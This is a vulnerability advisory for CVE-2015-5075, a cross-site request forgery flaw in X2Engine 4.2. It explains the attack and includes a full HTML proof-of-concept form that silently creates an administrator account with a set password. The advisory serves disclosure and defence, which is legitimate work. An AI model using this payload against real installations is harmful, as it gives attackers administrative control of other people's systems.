Vulnerability title: Cross-Site Request Forgery In X2Engine Inc. X2Engine
CVE: CVE-2015-5075
Vendor: X2Engine Inc.
Product: X2Engine
Affected version: 4.2
Fixed version: 5.2
Reported by: Simone Quatrini
Details:

It was discovered that no protection against Cross-site Request Forgery attacks was implemented, resulting in an attacker being able to able to force the creation of a new administrative account.
Impact:

Cross-site Request Forgery exploits the way in which HTTP and web browsers work.

Due to the fact that HTTP is a stateless protocol, and that web browsers will include all relevant cookies for the domain that a request is for, if an administrator user was logged into the application and the attacker sent a link that the administrator duly followed (or the attacker tricked them into following a link on a page), the administrator’s browser would include all cookies (including the session cookies) in the request. The attacker’s link would then be executed with administrator privileges.

This attack is not limited to sending malicious URLs to users; multiple different attack vectors exist to perform this attack in a more covert manner, such as embedding the attack within an invisible iFrame on a different page. Using the iFrame method it is also possible to submit both GET and POST requests.

For example:

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://localhost/x2engine/index.php/users/create" method="POST">
      <input type="hidden" name="User&#91;firstName&#93;" value="John" />
      <input type="hidden" name="User&#91;lastName&#93;" value="Smith" />
      <input type="hidden" name="User&#91;username&#93;" value="adm1n" />
      <input type="hidden" name="User&#91;password&#93;" value="letmein" />
      <input type="hidden" name="User&#91;userKey&#93;" value="" />
      <input type="hidden" name="User&#91;title&#93;" value="" />
      <input type="hidden" name="User&#91;department&#93;" value="" />
      <input type="hidden" name="User&#91;officePhone&#93;" value="" />
      <input type="hidden" name="User&#91;cellPhone&#93;" value="" />
      <input type="hidden" name="User&#91;homePhone&#93;" value="" />
      <input type="hidden" name="User&#91;address&#93;" value="" />
      <input type="hidden" name="User&#91;backgroundInfo&#93;" value="" />
      <input type="hidden" name="User&#91;emailAddress&#93;" value="" />
      <input type="hidden" name="User&#91;status&#93;" value="1" />
      <input type="hidden" name="yt0" value="Create" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
